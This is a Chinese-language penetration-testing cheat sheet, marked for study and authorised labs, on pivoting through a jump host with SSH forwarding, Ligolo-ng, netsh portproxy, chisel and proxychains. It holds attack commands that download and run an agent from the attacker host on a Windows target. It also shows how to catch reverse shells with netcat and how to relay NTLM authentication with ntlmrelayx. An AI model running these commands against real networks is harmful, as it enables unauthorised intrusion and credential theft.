# 隧道与转发

::: warning 仅供学习 / 授权实验
正向通 ≠ 目标能连回 Kali。反向连接的 LHOST 必须是**目标可达的那台跳板**。
:::

## SSH

```bash
# Kali 访问内网网站
ssh -N -L 127.0.0.1:8081:INTERNAL:8081 -D 1080 USER@PIVOT
curl http://127.0.0.1:8081/

# 让跳板听端口，转到 Kali 监听（目标主动连跳板）
ssh -N -R 0.0.0.0:4444:127.0.0.1:4444 USER@PIVOT
# 需要 sshd GatewayPorts yes，否则只绑 127.0.0.1
```

## Ligolo-ng

[nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

```bash
# Kali
sudo ip tuntap add user $(id -un) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# 控制台: session → start
sudo ip route add 10.10.20.0/24 dev ligolo

# 目标（Windows）
iwr http://LHOST/agent.exe -OutFile agent.exe
.\agent.exe -connect LHOST:11601 -ignore-cert
```

站点就在跳板本机时：

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
curl http://240.0.0.1:8081/
```

目标主动回连（反向 shell / NTLM）：

```text
# Kali 真监听
rlwrap nc -lvnp 4444
# ligolo 控制台：跳板 4445 → Kali 4444
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4444 --tcp
# payload 的 LHOST = 跳板内网 IP，LPORT = 4445
```

NTLM 中继同理：Kali `ntlmrelayx` 听 445，ligolo `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445`，UNC 填 `\\跳板IP\share`。Kali 先 `systemctl stop smbd`。

## Windows 跳板 portproxy

```powershell
netsh interface portproxy add v4tov4 listenport=445 listenaddress=PIVOT_IP connectport=445 connectaddress=KALI_IP
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=445 listenaddress=PIVOT_IP
```

## chisel

```bash
# Kali
./chisel server -p 8080 --reverse
# 目标
./chisel client LHOST:8080 R:socks
# Kali proxychains 1080
```

## proxychains

```bash
proxychains nmap -sT -Pn -p 445,1433,5985 INTERNAL
proxychains impacket-mssqlclient USER:PASS@INTERNAL
```
